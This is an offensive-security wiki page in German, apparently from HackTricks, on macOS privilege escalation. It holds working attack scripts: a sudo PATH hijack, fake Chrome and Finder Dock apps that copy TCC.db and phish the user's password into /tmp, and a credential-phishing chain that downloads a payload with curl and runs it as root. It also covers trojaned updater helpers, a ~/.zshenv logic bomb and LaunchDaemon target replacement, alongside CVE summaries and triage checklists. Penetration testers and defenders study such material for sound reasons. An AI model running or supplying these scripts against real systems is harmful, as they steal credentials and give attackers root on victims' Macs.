# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Wenn du wegen TCC Privilege Escalation hier bist, gehe zu:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Viele Privilege-Escalation-Techniken, die Linux oder andere Unix-ähnliche Systeme betreffen, funktionieren auch unter macOS. Siehe:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Benutzerinteraktion

### Sudo Hijacking

Die ursprüngliche [Sudo Hijacking-Technik findest du im Beitrag zur Linux Privilege Escalation](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

macOS **behält** jedoch die **`PATH`** des Benutzers bei, wenn dieser **`sudo`** ausführt. Das bedeutet, dass sich dieser Angriff auch auf andere Weise durchführen lässt: durch das **Hijacking anderer Binaries**, die das Opfer bei der **Verwendung von sudo** weiterhin ausführt:

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Beachte, dass ein Benutzer, der das Terminal verwendet, sehr wahrscheinlich **Homebrew installiert hat**. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock-Imitation

Mit etwas **Social Engineering** könntest du dich im Dock beispielsweise als **Google Chrome** ausgeben und tatsächlich dein eigenes Skript ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Prüfe, ob sich Chrome im Dock befindet. Falls ja, **entferne** diesen Eintrag und **füge** den **gefälschten** **Chrome-Eintrag an derselben Position** im Dock-Array hinzu.

<details>
<summary>Chrome-Dock-Imitationsskript</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Du **kannst Finder nicht aus dem Dock entfernen**. Wenn du ihn also zum Dock hinzufügen willst, kannst du den gefälschten Finder direkt neben den echten setzen. Dafür musst du **den Eintrag des gefälschten Finders am Anfang des Dock-Arrays hinzufügen**.
- Eine andere Möglichkeit ist, ihn nicht im Dock abzulegen, sondern einfach zu öffnen. „Finder bittet darum, Finder zu steuern“ ist nicht besonders ungewöhnlich.
- Eine weitere Möglichkeit, **ohne Passwortabfrage zu root zu eskalieren**, aber mit einem schrecklichen Dialog, besteht darin, Finder tatsächlich nach dem Passwort für eine privilegierte Aktion fragen zu lassen:
  - Finder anweisen, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren (In der Passwortabfrage steht dann „Finder möchte sudo kopieren“.)
  - Finder anweisen, ein neues **Authorization Plugin** zu kopieren (Du kannst den Dateinamen so festlegen, dass in der Passwortabfrage „Finder möchte Finder.bundle kopieren“ steht.)

<details>
<summary>Finder-Dock-Impersonation-Skript</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing über Passwortabfragen + Wiederverwendung von sudo

Malware missbraucht häufig die Benutzerinteraktion, um **ein für sudo geeignetes Passwort abzufangen** und programmgesteuert wiederzuverwenden. Ein gängiger Ablauf:

1. Den angemeldeten Benutzer mit `whoami` ermitteln.
2. **Passwortabfragen wiederholen**, bis `dscl . -authonly "$user" "$pw"` erfolgreich ist.
3. Die Zugangsdaten zwischenspeichern (z. B. in `/tmp/.pass`) und privilegierte Aktionen mit `sudo -S` ausführen (Passwort über stdin).

Beispiel für eine minimale Befehlskette:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Das gestohlene Passwort kann anschließend wiederverwendet werden, um **die Gatekeeper-Quarantäne mit `xattr -c` aufzuheben**, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stufen nicht interaktiv auszuführen.<sup>[[1]](#references)</sup>

## Neuere macOS-spezifische Vektoren (2023–2026)

### Veraltetes `AuthorizationExecuteWithPrivileges` weiterhin nutzbar

`AuthorizationExecuteWithPrivileges` wurde in 10.7 als veraltet eingestuft, **funktioniert aber weiterhin unter Sonoma/Sequoia**. Viele kommerzielle Updater rufen `/usr/libexec/security_authtrampoline` mit einem nicht vertrauenswürdigen Pfad auf. Ist die Zieldatei für den Benutzer beschreibbar, kannst du einen Trojaner platzieren und die legitime Abfrage nutzen:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Kombiniere dies mit den **oben genannten Masquerading-Tricks**, um einen glaubwürdigen Passwortdialog anzuzeigen.


### Triage von Privileged Helpern / XPC

Viele moderne macOS-Privescs von Drittanbietern folgen demselben Muster: Ein **LaunchDaemon mit root-Rechten** stellt einen **Mach/XPC-Service** aus **`/Library/PrivilegedHelperTools`** bereit. Anschließend validiert der Helper entweder **den Client nicht**, validiert ihn **zu spät** (PID-Race) oder stellt eine **root-Methode** bereit, die einen **benutzergesteuerten Pfad bzw. ein Skript** verarbeitet. Diese Bug-Klasse steckt hinter vielen aktuellen Fehlern in Helpern von VPN-Clients, Game-Launchern und Updatern.<sup>[[2]](#references)</sup>

Checkliste für die schnelle Triage:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Achte besonders auf Helfer, die:

- **nach der Deinstallation** weiterhin Anfragen annehmen, weil der Job in `launchd` geladen blieb
- Skripte ausführen oder Konfigurationen aus **`/Applications/...`** oder anderen Pfaden lesen, die für Nicht-root-Benutzer beschreibbar sind
- sich auf eine **PID-basierte** oder ausschließlich **bundle-id-basierte** Peer-Validierung verlassen, die sich durch Race Conditions ausnutzen lässt

Weitere Informationen zu Autorisierungsfehlern bei Helfern findest du auf [dieser Seite](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Vererbung der PackageKit-Skriptumgebung (CVE-2024-27822)

Bis Apple das Problem in **Sonoma 14.5**, **Ventura 13.6.7** und **Monterey 12.7.5** behoben hat, konnten vom Benutzer gestartete Installationen über **`Installer.app`** / **`PackageKit.framework`** PKG-Skripte als root in der Umgebung des aktuellen Benutzers ausführen. Das bedeutet: Ein Paket mit **`#!/bin/zsh`** lud die **`~/.zshenv`** des Angreifers und führte sie als **root** aus, wenn das Opfer das Paket installierte.<sup>[[3]](#references)</sup>

Das ist besonders interessant als **logic bomb**: Du brauchst lediglich einen foothold im Benutzerkonto und eine beschreibbare Shell-Startdatei. Dann wartest du, bis der Benutzer ein beliebiges anfälliges **zsh-basiertes** Installationsprogramm ausführt. Dies gilt im Allgemeinen **nicht** für **MDM/Munki**-Deployments, da diese in der Umgebung des root-Benutzers ausgeführt werden.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Wenn du tiefer in den Missbrauch installerspezifischer Funktionen einsteigen möchtest, schau dir auch [diese Seite](macos-files-folders-and-binaries/macos-installers-abuse.md) an.

### Kollision von Installationszielen über `.localized`

Manche Drittanbieter-Installer registrieren einen LaunchDaemon mit root-Rechten, dessen ausführbare Datei über einen festen Pfad innerhalb von `/Applications/Target.app` referenziert wird. Kann ein Angreifer dieses Bundle zuerst mit einer **anderen Bundle-ID** erstellen, behält Installer möglicherweise das Köder-Bundle bei und legt die echte App unter `/Applications/Target.localized/Target.app` ab. Der Daemon verweist weiterhin auf den ursprünglichen Pfad. Daher kann eine vom Angreifer kontrollierte ausführbare Datei im Köder-Bundle später als root ausgeführt werden.<sup>[[8]](#references)</sup>

Die wichtigen Voraussetzungen sind:<sup>[[8]](#references)</sup>

1. Der Angreifer kann den erwarteten Anwendungspfad erstellen oder kontrollieren.
2. Das Paket entfernt das kollidierende Bundle nicht.
3. Der privilegierte Job verwendet einen fest codierten Pfad innerhalb dieses Bundles.
4. Der Benutzer oder ein MDM-Workflow installiert das Paket und registriert den Job.

Suche nach verschobenen Bundles und prüfe anschließend die Ziele der LaunchDaemons mit der Enumerationsschleife im nächsten Abschnitt:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Ein sichereres Installationsprogramm ermittelt den endgültigen Bundle-Pfad und speichert privilegierte ausführbare Dateien an einem root-eigenen Ort wie `/Library/PrivilegedHelperTools`. Außerdem sollte es Eigentümer und Codesignatur überprüfen, bevor es den Job registriert oder startet.<sup>[[8]](#references)</sup>

### Hijacking eines beschreibbaren LaunchDaemon-Ziels

Eine LaunchDaemon-plist kann root-eigen sein, während ihr `Program`-Eintrag oder der erste Eintrag in `ProgramArguments` auf ein Verzeichnis verweist, das für Benutzer beschreibbar ist. Überprüfe den **gesamten Pfad**, nicht nur die Berechtigungen der ausführbaren Datei. Wenn das übergeordnete Verzeichnis beschreibbar ist, kann ein Angreifer eine root-eigene ausführbare Datei umbenennen und unter demselben Pfad einen Ersatz erstellen. Der Ersatz wird beim nächsten Start des Jobs als root ausgeführt. Ein Neustart oder ein normaler Dienstneustart genügt. Der Angreifer benötigt keine Berechtigung, `launchctl bootstrap` in der Systemdomäne auszuführen.<sup>[[7]](#references)</sup>

Zähle zunächst jedes Ziel und dessen direkt übergeordnetes Verzeichnis auf:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Wenn die Datei oder ihr übergeordnetes Verzeichnis beschreibbar ist, bewahren Sie die ursprüngliche Binärdatei auf und ersetzen Sie den Pfad durch eine ausführbare Payload. Warten Sie anschließend, bis der bereits geladene Daemon neu gestartet wird.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU-SMR-Race bei Credential-Zeigern (CVE-2025-24118)

Der anfällige Pfad `kauth_cred_proc_update` aktualisierte `proc_ro.p_ucred` mit der nicht-atomaren API `zalloc_ro_mut`, während SMR-Reader den Zeiger ohne Sperre luden. Der öffentliche Trigger verwendet eine speziell vorbereitete setgid-Binärdatei. Ein Thread wechselt zwischen seiner realen und effektiven Gruppen-ID, während ein anderer Thread wiederholt einen Systemaufruf wie `getgid()` ausführt.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Behandle dies als **Race-Primitive**, nicht als fertigen Root-Exploit. Der veröffentlichte PoC demonstriert einen zerrissenen Credential-Pointer. Häufig endet das in einer Kernel-Panic. Der Forscher konnte die Korruption nur auf Intel reproduzieren und zeigte keine deterministische Kontrolle über das resultierende Credential-Objekt. Apple änderte das Update in macOS 15.3 zu einem atomaren Pointer-Austausch.<sup>[[4]](#references)</sup>

### SIP-Bypass über den Migrationsassistenten („Migraine“, CVE-2023-32369)

Selbst wenn du bereits Root hast, blockiert SIP Schreibzugriffe auf Systempfade. Der **Migraine**-Bug missbraucht das Migration-Assistant-Entitlement `com.apple.rootless.install.heritable`, um einen Child-Prozess zu starten, der den SIP-Bypass erbt und geschützte Pfade überschreibt (z. B. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Die Angriffskette:

1. Root auf einem laufenden System erlangen.
2. `systemmigrationd` mit präpariertem Zustand dazu bringen, eine vom Angreifer kontrollierte Binärdatei auszuführen.
3. Das geerbte Entitlement nutzen, um SIP-geschützte Dateien zu patchen; die Änderung bleibt auch nach einem Neustart bestehen.

### NSPredicate-/XPC-Expression-Smuggling (Bug-Klasse CVE-2023-23530/23531)

Mehrere Apple-Daemons akzeptieren **NSPredicate**-Objekte über XPC und validieren nur das Feld `expressionType`, das vom Angreifer kontrolliert wird. Durch eine präparierte Predicate, die beliebige Selektoren auswertet, kannst du **Codeausführung in Root-/System-XPC-Diensten** erreichen (z. B. `coreduetd`, `contextstored`). In Kombination mit einem anfänglichen App-Sandbox-Escape ermöglicht dies eine **Privilegieneskalation ohne Benutzerabfragen**. Suche nach XPC-Endpunkten, die Predicates deserialisieren und keinen robusten Visitor verwenden.<sup>[[6]](#references)</sup>

## TCC – Privilegieneskalation auf Root-Ebene

### CVE-2020-9771 – mount_apfs-TCC-Bypass und Privilegieneskalation

**Jeder Benutzer** (auch Benutzer ohne besondere Rechte) kann mit `-o noowners` einen Time-Machine-Snapshot erstellen und mounten und **auf ALLE Dateien** dieses Snapshots zugreifen. Damit werden die Eigentümerprüfungen auf dem Live-Volume umgangen. Als einzige Berechtigung muss die verwendete Anwendung (z. B. `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) haben.

Die Befehle und die vollständige Erklärung findest du auf der Seite zu TCC-Bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensible Informationen

Dies kann zur Privilegieneskalation nützlich sein:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners – 2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Lokale Privilegieneskalation durch AWS Client VPN für macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilegieneskalation durch macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft „Migraine“-SIP-Bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center – Eine neue Bug-Klasse zur Privilegieneskalation unter macOS und iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon-Hijacking: Privilegieneskalation und Persistenz durch unsichere Ordnerberechtigungen](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS-LPE über das .localized-Verzeichnis](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
